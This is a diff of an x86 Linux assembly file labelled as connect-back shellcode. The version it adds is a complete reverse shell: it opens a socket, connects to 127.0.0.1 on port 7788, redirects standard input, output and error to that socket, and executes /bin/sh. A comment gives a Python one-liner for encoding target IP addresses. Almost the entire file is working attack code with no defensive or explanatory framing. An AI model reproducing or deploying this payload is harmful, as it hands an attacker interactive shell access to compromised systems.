@@ -1,23 +1,59 @@
 	;; Evan Jensen (wont) 021813
 	;; Connect back shellcode
 	;; Handy One liner for IP
-	;; reduce(lambda a,b:b+a,map(lambda a:hex(a)[2:].zfill(2),[192,168,1,1]))
-	;; Ports are big endian hex, don't be dumb
-	;; reduce(lambda a,b:b+a,(map(lambda a:hex(a)[2:].zfill(2),[int(i) for i in '2.1.1.0'.split('.')])))
-BITS 32
+	;; reduce(lambda a,b:b+a,(map(lambda a:hex(a)[2:].zfill(2),[int(i) for i in '127.0.0.1'.split('.')])))
+	;; port is littleEndian
+
+	BITS 32
 	global main
 main:
 	xor eax,eax
+	mov ebx,eax
 	push eax
-	inc eax
-	mov ebx,eax		;socketcall type=socket
-	push eax
-	inc eax
-	push eax
+	push byte 1
+	push byte 2
+	inc ebx
+	mov al,0x66
 	mov ecx,esp
-	mov al,0x66 		;socketcall unistd_32.h
-	int 0x80		;socket fd in eax
+	int 0x80
+
 	mov esi,eax
-	mov al,66		;socketcall unistd_32.h
-	inc ebx			;socketcall type=connect
-	push dword
+	xor eax,eax
+	mov al,0x66
+	inc ebx
+IPandPort:	
+	push dword 0x0100007f	;IP 127.0.0.1 Little Endian
+	push word  0x6c1e	;port 7788 Little Endian
+	push bx 		;bx=2 AF_INET
+	mov ecx,esp
+	push byte 16
+	push ecx
+	push esi
+	inc ebx			;ebx=3 connect()
+	mov ecx,esp
+	int 0x80
+
+	mov edi,eax		;connect fd
+	xor ecx,ecx
+	mov eax,ecx
+	mov edx,ecx
+	mov cl,2
+copy:
+	mov al,63		;dup2 63
+	int 0x80
+	dec ecx
+	jns copy
+
+	xor eax,eax
+	push eax
+	push 0x68732f2f
+	push 0x6e69622f
+	mov al,11
+	mov ebx,esp
+	xor ecx,ecx
+	mov edx,ecx
+	int 0x80
+
+	;; Any local shellcode here
+
+	
